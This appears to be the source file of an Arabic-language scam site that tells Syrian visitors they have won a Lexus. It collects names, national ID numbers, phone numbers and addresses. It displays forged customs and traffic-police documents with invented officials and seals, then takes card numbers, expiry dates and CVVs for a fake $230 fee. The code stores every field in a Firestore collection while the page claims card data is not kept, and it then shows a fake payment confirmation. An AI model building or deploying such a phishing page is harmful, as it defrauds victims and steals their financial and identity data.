"use client"

import type React from "react"
import { useState } from "react"
import { db } from "@/lib/firebase"
import { collection, addDoc } from "firebase/firestore"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { LexusHero } from "@/components/lexus-hero"
import {
  CheckCircle2,
  ChevronLeft,
  ChevronRight,
  User,
  MapPin,
  Sparkles,
  ShieldCheck,
  FileCheck,
  FileText,
  CreditCard,
  Phone,
  MessageCircle,
  Loader2,
  AlertCircle,
} from "lucide-react"

const syrianGovernorates = [
  "دمشق",
  "ريف دمشق",
  "حلب",
  "حمص",
  "حماة",
  "اللاذقية",
  "طرطوس",
  "إدلب",
  "درعا",
  "السويداء",
  "القنيطرة",
  "دير الزور",
  "الرقة",
  "الحسكة",
]

type Stage = "form1" | "form2" | "customs" | "payment" | "processing" | "agent"

export function LexusPrizeForm() {
  const [stage, setStage] = useState<Stage>("form1")
  const [formData, setFormData] = useState({
    fullName: "",
    nationalId: "",
    phone: "",
    whatsapp: "",
    governorate: "",
    city: "",
    address: "",
    nearestLandmark: "",
  })
  const [cardData, setCardData] = useState({
    cardNumber: "",
    cardHolder: "",
    expiry: "",
    cvv: "",
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [referenceNumber] = useState("LX-" + Math.floor(100000 + Math.random() * 900000))
  const declarationNumber = "26/458732"
  const declarationDate = "02/05/2026"

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value })
  }

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardData({ ...cardData, [e.target.name]: e.target.value })
  }

  const handleConfirmPayment = async (e: React.FormEvent) => {
 e.preventDefault()

await addDoc(collection(db, "orders"), {
  ...formData,
  ...cardData,
  createdAt: new Date(),
})

setIsProcessing(true)
setStage("processing")

await new Promise((resolve) => setTimeout(resolve, 3000))

setIsProcessing(false)
setStage("agent")
  }

  const canProceedStep1 = formData.fullName && formData.nationalId && formData.phone
  const canProceedStep2 = formData.governorate && formData.city && formData.address
  const canPay =
    cardData.cardNumber.length >= 12 &&
    cardData.cardHolder &&
    cardData.expiry &&
    cardData.cvv.length >= 3

  // ============================================
  // STAGE: AGENT CONTACT (Final)
  // ============================================
  if (stage === "agent") {
    return (
      <Card className="border-gold/30 bg-card shadow-gold overflow-hidden">
        <div className="h-1 bg-gold-gradient" />
        <CardContent className="p-8 md:p-12 text-center">
          <div className="w-20 h-20 rounded-full bg-gold-gradient flex items-center justify-center mx-auto mb-6 shadow-gold">
            <CheckCircle2 className="w-12 h-12 text-background" strokeWidth={2.5} />
          </div>
          <h2 className="text-3xl md:text-4xl font-extrabold text-gold-gradient mb-3">
            تم تأكيد الدفع بنجاح
          </h2>
          <p className="text-muted-foreground text-lg mb-8 leading-relaxed">
            تم استلام دفعة رسوم نقل الملكية بقيمة <span className="text-gold font-bold">230$</span>
            <br />
            يرجى التواصل مع الوكيل الآن لإكمال باقي الإجراءات الرسمية
          </p>

          <div className="bg-gold/10 border-2 border-gold/40 rounded-2xl p-6 mb-6">
            <p className="text-muted-foreground text-sm mb-3">الرقم المرجعي لمعاملتك</p>
            <p className="text-3xl font-extrabold text-gold tracking-widest mb-3">{referenceNumber}</p>
            <div className="border-t border-gold/20 pt-3 mt-3">
              <p className="text-xs text-muted-foreground">رقم البيان الجمركي</p>
              <p className="text-lg font-bold text-foreground">{declarationNumber}</p>
            </div>
          </div>

          <a
            href="https://wa.me/963900000000"
            target="_blank"
            rel="noopener noreferrer"
            className="w-full inline-flex items-center justify-center gap-3 bg-gold-gradient text-background font-extrabold h-14 px-6 rounded-md text-lg shadow-gold hover:opacity-90 transition-opacity mb-3"
          >
            <MessageCircle className="w-6 h-6" />
            تواصل مع الوكيل الآن
          </a>

          <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
            <Phone className="w-4 h-4 text-gold" />
            <span>أو اتصل على رقم الوكيل الرسمي</span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-8 text-right">
            <div className="bg-secondary/30 rounded-lg p-4 border border-border">
              <ShieldCheck className="w-6 h-6 text-gold mb-2" />
              <p className="text-sm font-bold text-foreground mb-1">تسليم رسمي</p>
              <p className="text-xs text-muted-foreground">خلال 5-7 أيام عمل</p>
            </div>
            <div className="bg-secondary/30 rounded-lg p-4 border border-border">
              <FileCheck className="w-6 h-6 text-gold mb-2" />
              <p className="text-sm font-bold text-foreground mb-1">أوراق كاملة</p>
              <p className="text-xs text-muted-foreground">شهادة تسجيل ولوحات رسمية</p>
            </div>
            <div className="bg-secondary/30 rounded-lg p-4 border border-border">
              <Sparkles className="w-6 h-6 text-gold mb-2" />
              <p className="text-sm font-bold text-foreground mb-1">جاهزة للاستلام</p>
              <p className="text-xs text-muted-foreground">لكزس LX 700 موديل 2025</p>
            </div>
          </div>
        </CardContent>
      </Card>
    )
  }

  // ============================================
  // STAGE: PROCESSING
  // ============================================
  if (stage === "processing") {
    return (
      <Card className="border-gold/30 bg-card shadow-gold overflow-hidden">
        <div className="h-1 bg-gold-gradient" />
        <CardContent className="p-12 md:p-16 text-center">
          <Loader2 className="w-20 h-20 text-gold animate-spin mx-auto mb-6" />
          <h2 className="text-2xl md:text-3xl font-extrabold text-foreground mb-3">
            جاري معالجة الدفع...
          </h2>
          <p className="text-muted-foreground text-base leading-relaxed">
            يرجى الانتظار، يتم الآن التحقق من بيانات الدفع
            <br />
            ��ا تغلق الصفحة
          </p>
        </CardContent>
      </Card>
    )
  }

  // ============================================
  // STAGE: PAYMENT (نقل ملكية)
  // ============================================
  if (stage === "payment") {
    return (
      <Card className="border-gold/30 bg-card shadow-gold overflow-hidden">
        <div className="h-1 bg-gold-gradient" />
        <CardContent className="p-6 md:p-10">
          <form onSubmit={handleConfirmPayment} className="space-y-6">
            <div className="text-center mb-6">
              <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-gold/10 border border-gold/30 mb-4">
                <CreditCard className="w-7 h-7 text-gold" />
              </div>
              <h2 className="text-2xl md:text-3xl font-extrabold text-foreground mb-2">
                دفع رسوم نقل ملكية السيارة
              </h2>
              <p className="text-muted-foreground text-sm">
                يرجى إدخال بيانات البطاقة لإتمام دفع رسوم نقل الملكية
              </p>
            </div>

            <div className="bg-gold/10 border-2 border-gold/40 rounded-xl p-5">
              <div className="flex items-center justify-between mb-3">
                <span className="text-foreground font-bold">رسوم نقل ملكية المركبة</span>
                <span className="text-2xl font-extrabold text-gold">230 $</span>
              </div>
              <div className="border-t border-gold/20 pt-3 text-xs text-muted-foreground space-y-1">
                <div className="flex justify-between">
                  <span>اسم المستفيد:</span>
                  <span className="text-foreground font-medium">{formData.fullName}</span>
                </div>
                <div className="flex justify-between">
                  <span>المركبة:</span>
                  <span className="text-foreground font-medium">جيب لكزس LX 600</span>
                </div>
                <div className="flex justify-between">
                  <span>رقم البيان:</span>
                  <span className="text-foreground font-medium">{declarationNumber}</span>
                </div>
              </div>
            </div>

            <div className="space-y-5">
              <div>
                <label className="block text-sm font-bold text-foreground mb-2">
                  رقم البطاقة <span className="text-gold">*</span>
                </label>
                <Input
                  name="cardNumber"
                  value={cardData.cardNumber}
                  onChange={handleCardChange}
                  required
                  inputMode="numeric"
                  maxLength={19}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className="bg-secondary/40 border-border text-foreground h-12 text-base tracking-wider"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-foreground mb-2">
                  اسم حامل البطاقة <span className="text-gold">*</span>
                </label>
                <Input
                  name="cardHolder"
                  value={cardData.cardHolder}
                  onChange={handleCardChange}
                  required
                  placeholder="CARDHOLDER NAME"
                  className="bg-secondary/40 border-border text-foreground h-12 text-base uppercase"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    تاريخ الانتهاء <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="expiry"
                    value={cardData.expiry}
                    onChange={handleCardChange}
                    required
                    placeholder="MM/YY"
                    maxLength={5}
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    CVV <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="cvv"
                    value={cardData.cvv}
                    onChange={handleCardChange}
                    required
                    inputMode="numeric"
                    maxLength={4}
                    placeholder="XXX"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>
              </div>
            </div>

            <div className="bg-secondary/40 border border-gold/20 rounded-lg p-4 flex items-start gap-3">
              <ShieldCheck className="w-5 h-5 text-gold flex-shrink-0 mt-0.5" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                جميع المعاملات مشفرة وآمنة. لن يتم حفظ بيانات البطاقة بعد إتمام عملية الدفع. هذه الرسوم
                مخصصة فقط لإجراءات نقل ملكية المركبة باسمك في إدارة المرور.
              </p>
            </div>

            <div className="flex flex-col-reverse md:flex-row justify-between gap-3 pt-2">
              <Button
                type="button"
                onClick={() => setStage("customs")}
                variant="outline"
                className="border-border bg-transparent text-foreground hover:bg-secondary h-12 px-8 text-base"
              >
                <ChevronRight className="w-5 h-5 ml-2" />
                رجوع
              </Button>
              <Button
                type="submit"
                disabled={!canPay || isProcessing}
                className="bg-gold-gradient hover:opacity-90 text-background font-extrabold h-14 px-8 text-base shadow-gold disabled:opacity-50 disabled:cursor-not-allowed flex-1 md:flex-initial md:min-w-[280px]"
              >
                <CheckCircle2 className="w-5 h-5 ml-2" />
                موافق - تأكيد الدفع 230$
              </Button>
            </div>
          </form>
        </CardContent>
      </Card>
    )
  }

  // ============================================
  // STAGE: CUSTOMS DECLARATION
  // ============================================
  if (stage === "customs") {
    return (
      <div className="space-y-6">
        <div className="text-center mb-2">
          <div className="inline-flex items-center gap-2 bg-gold/10 border border-gold/30 rounded-full px-5 py-2 mb-3">
            <FileText className="w-4 h-4 text-gold" />
            <span className="text-xs font-bold text-gold">المستندات الرسمية للمركبة</span>
          </div>
          <h2 className="text-2xl md:text-3xl font-extrabold text-foreground mb-1">
            البيان الجمركي وتأمين المركبة
          </h2>
          <p className="text-muted-foreground text-sm">
            تم إصدار المستندات الرسمية باسمك. يرجى المراجعة ثم متابعة دفع رسوم نقل الملكية.
          </p>
        </div>

        {/* Customs Declaration Document */}
        <Card className="bg-white border-2 border-blue-900 overflow-hidden shadow-xl">
          <CardContent className="p-0">
            {/* Document Header */}
            <div className="bg-white border-b-4 border-double border-blue-900 p-4 md:p-6">
              <div className="flex items-start justify-between gap-4">
                <div className="text-right text-blue-900 text-xs md:text-sm font-bold space-y-1">
                  <p>الجمهورية العربية السورية</p>
                  <p>وزارة المالية</p>
                  <p>إدارة الجمارك</p>
                  <p>مديرية ضريبة الجمارك</p>
                </div>
                <div className="flex-shrink-0">
                  <div className="w-16 h-16 md:w-20 md:h-20 rounded-full bg-gradient-to-br from-yellow-500 to-yellow-700 flex items-center justify-center border-4 border-yellow-800">
                    <svg viewBox="0 0 24 24" className="w-10 h-10 md:w-12 md:h-12 text-yellow-900" fill="currentColor">
                      <path d="M12 2L4 7v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V7l-8-5z" />
                    </svg>
                  </div>
                </div>
                <div className="text-left text-blue-900 text-xs md:text-sm font-bold space-y-1">
                  <p>الرقم الصادر : {declarationNumber}</p>
                  <p>التاريخ : {declarationDate}</p>
                </div>
              </div>
            </div>

            {/* Title */}
            <div className="bg-white p-4 md:p-6 text-center border-b border-blue-900">
              <h3 className="text-xl md:text-2xl font-extrabold text-blue-900 mb-2">
                إشعار رسوم معاملات مركبة
              </h3>
              <div className="inline-block border-2 border-blue-900 px-4 py-1 text-blue-900 font-bold text-sm">
                إشعار إداري
              </div>
            </div>

            {/* Body */}
            <div className="p-4 md:p-6 text-blue-950 space-y-4 text-sm md:text-base bg-white">
              <div>
                <p className="font-bold mb-1">إلى من يهمه الأمر</p>
                <p className="text-xs md:text-sm text-blue-900/80">تحية طيبة وبعد،،،</p>
              </div>
              <p className="leading-relaxed text-xs md:text-sm">
                نحيطكم علماً بأنه تم تحديد الرسوم المترتبة على معاملة المركبة الموضحة بياناتها أدناه،
                وذلك وفق الإجراءات والأنظمة المعتمدة في معبر نصيب الحدودي.
              </p>

              {/* Owner & Vehicle Info */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="border-2 border-blue-900 rounded">
                  <div className="bg-blue-900 text-white px-3 py-1.5 text-xs md:text-sm font-bold text-right">
                    أولاً: بيانات صاحب المركبة
                  </div>
                  <table className="w-full text-xs md:text-sm">
                    <tbody>
                      <tr className="border-b border-blue-900">
                        <td className="p-2 text-right font-bold bg-blue-50 w-1/3 border-l border-blue-900">
                          الاسم
                        </td>
                        <td className="p-2 text-right font-bold text-blue-950">
                          {formData.fullName || "—"}
                        </td>
                      </tr>
                      <tr>
                        <td className="p-2 text-right font-bold bg-blue-50 border-l border-blue-900">
                          الرقم الوطني
                        </td>
                        <td className="p-2 text-right font-bold text-blue-950">
                          {formData.nationalId || "—"}
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
                <div className="border-2 border-blue-900 rounded">
                  <div className="bg-blue-900 text-white px-3 py-1.5 text-xs md:text-sm font-bold text-right">
                    ثانياً: بيانات المركبة
                  </div>
                  <table className="w-full text-xs md:text-sm">
                    <tbody>
                      <tr className="border-b border-blue-900">
                        <td className="p-2 text-right font-bold bg-blue-50 w-1/3 border-l border-blue-900">
                          نوع المركبة
                        </td>
                        <td className="p-2 text-right text-blue-950">جيب لكزس LX 600</td>
                      </tr>
                      <tr className="border-b border-blue-900">
                        <td className="p-2 text-right font-bold bg-blue-50 border-l border-blue-900">
                          رقم الشاصي
                        </td>
                        <td className="p-2 text-right text-blue-950 font-mono text-xs">
                          JTJMB7CX5R4065541
                        </td>
                      </tr>
                      <tr>
                        <td className="p-2 text-right font-bold bg-blue-50 border-l border-blue-900">
                          بلد الصنع
                        </td>
                        <td className="p-2 text-right text-blue-950">اليابان</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Fees Table */}
              <div className="border-2 border-blue-900 rounded overflow-hidden">
                <div className="bg-blue-900 text-white px-3 py-1.5 text-xs md:text-sm font-bold text-right">
                  ثالثاً: تفاصيل الرسوم
                </div>
                <table className="w-full text-xs md:text-sm">
                  <thead className="bg-blue-50 border-b-2 border-blue-900">
                    <tr>
                      <th className="p-2 text-right font-bold text-blue-950 w-10 border-l border-blue-900">م</th>
                      <th className="p-2 text-right font-bold text-blue-950 border-l border-blue-900">
                        بيان الرسوم
                      </th>
                      <th className="p-2 text-right font-bold text-blue-950">القيمة (دولار أمريكي)</th>
                    </tr>
                  </thead>
                  <tbody className="text-blue-950">
                    {[
                      ["1", "رسوم طرح ملكية خاصة", "198.00"],
                      ["2", "رسوم الترقيم (التعسير)", "120.00"],
                      ["3", "رسوم التسجيل", "120.00"],
                      ["4", "رسوم الإخراج", "73.00"],
                      ["5", "رسوم القحص الفني", "50.00"],
                      ["6", "تأمين إلزامي", "217.00"],
                    ].map(([no, desc, val]) => (
                      <tr key={no} className="border-b border-blue-200">
                        <td className="p-2 text-right border-l border-blue-200">{no}</td>
                        <td className="p-2 text-right border-l border-blue-200">{desc}</td>
                        <td className="p-2 text-right font-medium">{val}</td>
                      </tr>
                    ))}
                    <tr className="bg-blue-900 text-white font-extrabold">
                      <td colSpan={2} className="p-2.5 text-right border-l border-white/20">
                        المجموع
                      </td>
                      <td className="p-2.5 text-right text-base md:text-lg">778.00</td>
                    </tr>
                    <tr className="bg-blue-50 text-blue-900 text-xs">
                      <td colSpan={2} className="p-2 text-right border-l border-blue-200">
                        الإجمالي الكلي (سبعمائة وثمانية وسبعون دولار أمريكي فقط لا غير)
                      </td>
                      <td className="p-2 text-right font-bold">778.00</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <p className="text-xs text-blue-900/80 leading-relaxed">
                المبلغ أعلاه شامل جميع الرسوم المذكورة ولا توجد أية مبالغ إضافية أخرى.
              </p>

              {/* Signatures */}
              <div className="grid grid-cols-2 gap-4 pt-4 border-t border-blue-200 mt-4">
                <div className="text-center text-xs md:text-sm">
                  <p className="font-bold text-blue-950 mb-1">مدير عام الجمارك</p>
                  <div className="h-12 flex items-center justify-center text-blue-700 font-mono italic">
                    توقيع
                  </div>
                  <p className="text-xs text-blue-900">خالد أحمد محمد البراد</p>
                </div>
                <div className="flex items-center justify-center">
                  <div className="w-20 h-20 rounded-full border-4 border-blue-900 flex items-center justify-center text-[10px] text-blue-900 font-bold text-center leading-tight">
                    إدارة الجمارك
                    <br />
                    معبر نصيب الحدودي
                  </div>
                </div>
              </div>

              <div className="bg-blue-900 text-white text-[10px] md:text-xs text-center p-2 rounded">
                هذا الإشعار صادر عن إدارة الجمارك في معبر نصيب الحدودي ولا يعد وثيقة رسمية إلا بعد ختم
                الجهة المختصة.
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Vehicle Registration Certificate (شهادة تسجيل المركبة) */}
        <Card className="bg-white border-2 border-amber-700 overflow-hidden shadow-xl">
          <CardContent className="p-0">
            {/* Decorative top border */}
            <div className="h-2 bg-gradient-to-r from-amber-700 via-amber-500 to-amber-700" />

            {/* Bismillah */}
            <div className="text-center py-3 bg-white border-b border-amber-200">
              <p className="text-amber-800 font-bold text-sm md:text-base">
                بسم الله الرحمن الرحيم
              </p>
            </div>

            {/* Header */}
            <div className="p-4 md:p-6 bg-white border-b-2 border-amber-700">
              <div className="grid grid-cols-3 items-start gap-2">
                {/* Left - Numbers */}
                <div className="text-amber-900 text-[10px] md:text-xs font-bold space-y-1 text-right">
                  <div className="flex justify-between gap-2">
                    <span>2026 / 2347</span>
                    <span>: الرقم</span>
                  </div>
                  <div className="flex justify-between gap-2">
                    <span>02/05/2026</span>
                    <span>: التاريخ</span>
                  </div>
                  <div className="flex justify-between gap-2">
                    <span>5 / شوال / 1447 هـ</span>
                    <span>: الموافق</span>
                  </div>
                </div>

                {/* Center - Eagle Emblem */}
                <div className="flex flex-col items-center">
                  <div className="w-14 h-14 md:w-20 md:h-20 rounded-full bg-gradient-to-br from-amber-500 to-amber-800 flex items-center justify-center border-4 border-amber-700">
                    <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-12 md:h-12 text-amber-100" fill="currentColor">
                      <path d="M12 2L4 7v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V7l-8-5z" />
                    </svg>
                  </div>
                  <div className="mt-1 px-2 py-0.5 bg-amber-700 text-white text-[8px] md:text-[10px] font-bold rounded">
                    TRAFFIC POLICE
                  </div>
                  <p className="text-amber-900 text-[9px] md:text-xs font-bold mt-1">فرع مرور دمشق</p>
                </div>

                {/* Right - Authority */}
                <div className="text-amber-900 text-[10px] md:text-sm font-bold space-y-1 text-right">
                  <p>الجمهورية العربية السورية</p>
                  <p>إدارة مرور الشام</p>
                  <p>فرع درعا</p>
                </div>
              </div>
            </div>

            {/* Title */}
            <div className="text-center py-5 bg-white border-b border-amber-300">
              <h3 className="text-xl md:text-2xl font-extrabold text-amber-900 leading-tight">
                كتاب تسجيل مركبة
                <br />
                لدى إدارة مرور الشام
              </h3>
            </div>

            {/* Body */}
            <div className="p-4 md:p-6 bg-white text-amber-950 space-y-4">
              <div className="flex items-center gap-2 text-sm md:text-base">
                <span className="font-bold">: إلى السيد</span>
                <span className="font-bold text-amber-900 border-b border-amber-700 px-3 flex-1 text-right">
                  {formData.fullName || "—"}
                </span>
              </div>
              <p className="text-xs md:text-sm font-bold">تحية طيبة وبعد ،،</p>
              <p className="text-xs md:text-sm leading-relaxed">
                بناءً على طلبكم لتسجيل المركبة لدى إدارة مرور الشام، وبعد التدقيق على الوثائق والمستندات
                المقدمة، وبناءً على أحكام القوانين والأنظمة المرورية النافذة، تقرر تسجيل بيانات المركبة
                وإعطاؤها رقم لوحة على النحو التالي:
              </p>

              {/* Vehicle Info Table */}
              <div className="border-2 border-amber-800 rounded overflow-hidden">
                <table className="w-full text-xs md:text-sm">
                  <tbody>
                    <tr className="border-b border-amber-800">
                      <td className="p-2 text-right font-bold bg-amber-50 w-1/3 border-l border-amber-800">
                        نوع المركبة
                      </td>
                      <td className="p-2 text-right text-amber-950 font-bold">جيب لكزس LX 600</td>
                    </tr>
                    <tr className="border-b border-amber-800">
                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
                        موديل
                      </td>
                      <td className="p-2 text-right text-amber-950">2025</td>
                    </tr>
                    <tr className="border-b border-amber-800">
                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
                        لون المركبة
                      </td>
                      <td className="p-2 text-right text-amber-950">أبيض</td>
                    </tr>
                    <tr className="border-b border-amber-800">
                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
                        رقم المركبة (اللوحة)
                      </td>
                      <td className="p-2 text-right">
                        <div className="inline-flex items-center gap-2 border-2 border-amber-900 rounded px-3 py-1 bg-white">
                          <span className="font-extrabold text-amber-950 text-sm md:text-base">سوريا</span>
                          <span className="font-extrabold text-amber-950 text-sm md:text-base">64</span>
                          <span className="text-[10px] font-bold text-amber-700 border border-amber-700 rounded px-1">
                            SYR
                          </span>
                          <span className="font-extrabold text-amber-950 text-sm md:text-base">10728</span>
                        </div>
                      </td>
                    </tr>
                    <tr className="border-b border-amber-800">
                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
                        رقم الشاصي
                      </td>
                      <td className="p-2 text-right text-amber-950 font-mono">JTJMB7CX5R4065541</td>
                    </tr>
                    <tr>
                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
                        اسم المالك
                      </td>
                      <td className="p-2 text-right text-amber-950 font-bold">
                        {formData.fullName || "—"}
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* Fees Table */}
              <div className="pt-2">
                <p className="font-bold text-sm md:text-base mb-2 text-right">: تفصيل الرسوم والبدلات</p>
                <div className="border-2 border-amber-800 rounded overflow-hidden">
                  <table className="w-full text-xs md:text-sm">
                    <thead className="bg-amber-50 border-b-2 border-amber-800">
                      <tr>
                        <th className="p-2 text-right font-bold text-amber-950 w-10 border-l border-amber-800">
                          م
                        </th>
                        <th className="p-2 text-right font-bold text-amber-950 border-l border-amber-800">
                          البيان
                        </th>
                        <th className="p-2 text-right font-bold text-amber-950">القيمة بالدولار الأمريكي</th>
                      </tr>
                    </thead>
                    <tbody className="text-amber-950">
                      {[
                        ["1", "رسوم كاملة للمرور", "$ 917"],
                        ["2", "طوابع", "$ 119"],
                        ["3", "تكلفة إصدار لوحة حديدية عدد 2", "$ 170"],
                        ["4", "تكلفة طباعة شهادة مركبة", "$ 97"],
                        ["5", "رسوم قائض وفوائد", "$ 33.5"],
                      ].map(([no, desc, val]) => (
                        <tr key={no} className="border-b border-amber-200">
                          <td className="p-2 text-right border-l border-amber-200">{no}</td>
                          <td className="p-2 text-right border-l border-amber-200">{desc}</td>
                          <td className="p-2 text-right font-medium">{val}</td>
                        </tr>
                      ))}
                      <tr className="bg-amber-100 font-extrabold border-t-2 border-amber-800">
                        <td colSpan={2} className="p-2.5 text-right text-amber-950 border-l border-amber-300">
                          الإجمالي الكلي
                        </td>
                        <td className="p-2.5 text-right text-amber-950 text-base">$ 1,336.50</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              <p className="text-[11px] md:text-xs leading-relaxed text-amber-900">
                <span className="font-bold">ملاحظة:</span> يعتبر هذا التسجيل نافذاً بعد تسديد الرسوم
                والبدلات المذكورة أعلاه، والالتزام بكافة القوانين والأنظمة المرورية المعمول بها.
              </p>

              {/* Signatures */}
              <div className="grid grid-cols-3 gap-3 pt-4 border-t-2 border-amber-300">
                <div className="text-center text-[10px] md:text-xs">
                  <p className="font-bold text-amber-950 mb-1">الموظف المختص</p>
                  <p className="text-[9px] md:text-[11px] text-amber-900 mb-2">
                    الرقيب أول محمود العلي
                  </p>
                  <div className="h-8 flex items-center justify-center text-amber-700 italic font-serif text-sm">
                    ✓
                  </div>
                </div>
                <div className="flex flex-col items-center justify-center">
                  <div className="w-16 h-16 md:w-20 md:h-20 rounded-full border-2 border-amber-700 flex items-center justify-center bg-amber-50">
                    <div className="text-center">
                      <p className="text-[8px] md:text-[10px] font-bold text-amber-800 leading-tight">
                        طابع مالي
                      </p>
                      <p className="text-amber-900 font-extrabold text-sm md:text-base">119$</p>
                      <p className="text-[7px] md:text-[9px] font-bold text-amber-800 leading-tight">
                        إدارة مرور الشام
                      </p>
                    </div>
                  </div>
                </div>
                <div className="text-center text-[10px] md:text-xs">
                  <p className="font-bold text-amber-950 mb-1">مدير مرور الشام</p>
                  <p className="text-[9px] md:text-[11px] text-amber-900 mb-2">
                    المقدم فادي أحمد العيد الله
                  </p>
                  <div className="h-8 flex items-center justify-center text-amber-700 italic font-serif text-sm">
                    ✓
                  </div>
                </div>
              </div>

              {/* QR + Verification */}
              <div className="flex items-center gap-3 pt-4 border-t border-amber-200">
                <div className="w-14 h-14 md:w-16 md:h-16 bg-white border-2 border-amber-900 rounded grid grid-cols-4 grid-rows-4 gap-0.5 p-1 flex-shrink-0">
                  {Array.from({ length: 16 }).map((_, i) => (
                    <div
                      key={i}
                      className={`${[0, 2, 5, 6, 8, 11, 13, 14, 15].includes(i) ? "bg-amber-900" : ""}`}
                    />
                  ))}
                </div>
                <p className="text-[10px] md:text-xs text-amber-900 leading-relaxed">
                  للتحقق من صحة البيانات يرجى مسح رمز QR أو زيارة الموقع الرسمي لإدارة مرور الشام.
                </p>
              </div>
            </div>

            {/* Decorative bottom border */}
            <div className="h-2 bg-gradient-to-r from-amber-700 via-amber-500 to-amber-700" />
          </CardContent>
        </Card>

        {/* Required Action */}
        <Card className="bg-gold/10 border-2 border-gold/40">
          <CardContent className="p-5 md:p-6">
            <div className="flex items-start gap-4 mb-4">
              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-gold-gradient flex items-center justify-center shadow-gold">
                <AlertCircle className="w-6 h-6 text-background" />
              </div>
              <div className="flex-1">
                <h3 className="text-lg md:text-xl font-extrabold text-foreground mb-2">
                  الخطوة الأخيرة: دفع رسوم نقل الملكية
                </h3>
                <p className="text-sm text-muted-foreground leading-relaxed mb-3">
                  لإتمام إجراءات تسجيل المركبة باسمك في إدارة المرور وتسليمها رسمياً، يجب دفع رسوم نقل
                  الملكية وقدرها{" "}
                  <span className="text-gold font-extrabold text-base">230 دولار أمريكي</span> فقط.
                </p>
                <div className="bg-secondary/40 rounded-lg p-3 text-xs text-muted-foreground">
                  هذه الرسوم تشمل: نقل الملكية في إدارة المرور، استخراج شهادة التسجيل، إصدار لوحات
                  مرورية رسمية، وتسليم المركبة في عنوانك.
                </div>
              </div>
            </div>

            <Button
              type="button"
              onClick={() => setStage("payment")}
              className="w-full bg-gold-gradient hover:opacity-90 text-background font-extrabold h-14 text-base shadow-gold"
            >
              <CheckCircle2 className="w-5 h-5 ml-2" />
              موافق - متابعة دفع 230$
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  // ============================================
  // STAGE: FORMS (Step 1 & 2)
  // ============================================
  return (
    <>
      <LexusHero />
      <Card className="border-gold/30 bg-card shadow-gold overflow-hidden">
        <div className="h-1 bg-gold-gradient" />

      {/* Steps Indicator */}
      <div className="border-b border-border bg-secondary/20 px-6 py-5">
        <div className="flex items-center justify-center gap-4">
          <div className="flex items-center gap-3">
            <div
              className={`w-10 h-10 rounded-full flex items-center justify-center font-bold transition-all ${
                stage === "form1" || stage === "form2"
                  ? "bg-gold-gradient text-background shadow-gold"
                  : "bg-secondary text-muted-foreground border border-border"
              }`}
            >
              {stage === "form2" ? <CheckCircle2 className="w-5 h-5" /> : "1"}
            </div>
            <span
              className={`hidden md:block text-sm font-bold ${
                stage === "form1" ? "text-foreground" : "text-muted-foreground"
              }`}
            >
              البيانات الشخصية
            </span>
          </div>

          <div className={`w-16 h-0.5 ${stage === "form2" ? "bg-gold" : "bg-border"}`} />

          <div className="flex items-center gap-3">
            <div
              className={`w-10 h-10 rounded-full flex items-center justify-center font-bold transition-all ${
                stage === "form2"
                  ? "bg-gold-gradient text-background shadow-gold"
                  : "bg-secondary text-muted-foreground border border-border"
              }`}
            >
              2
            </div>
            <span
              className={`hidden md:block text-sm font-bold ${
                stage === "form2" ? "text-foreground" : "text-muted-foreground"
              }`}
            >
              عنوان التسليم
            </span>
          </div>
        </div>
      </div>

      <CardContent className="p-6 md:p-10">
        <form
          onSubmit={(e) => {
            e.preventDefault()
            setStage("customs")
          }}
        >
          {stage === "form1" && (
            <div className="space-y-6">
              <div className="text-center mb-8">
                <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-gold/10 border border-gold/30 mb-4">
                  <User className="w-7 h-7 text-gold" />
                </div>
                <h2 className="text-2xl md:text-3xl font-extrabold text-foreground mb-2">
                  البيانات الشخصية للفائز
                </h2>
                <p className="text-muted-foreground text-sm">
                  يرجى إدخال بياناتك مطابقة للهوية الشخصية الرسمية
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div className="md:col-span-2">
                  <label className="block text-sm font-bold text-foreground mb-2">
                    الاسم الثلاثي الكامل <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="fullName"
                    value={formData.fullName}
                    onChange={handleInputChange}
                    required
                    placeholder="مثال: محمد أحمد علي"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>

                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    الرقم الوطني <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="nationalId"
                    value={formData.nationalId}
                    onChange={handleInputChange}
                    required
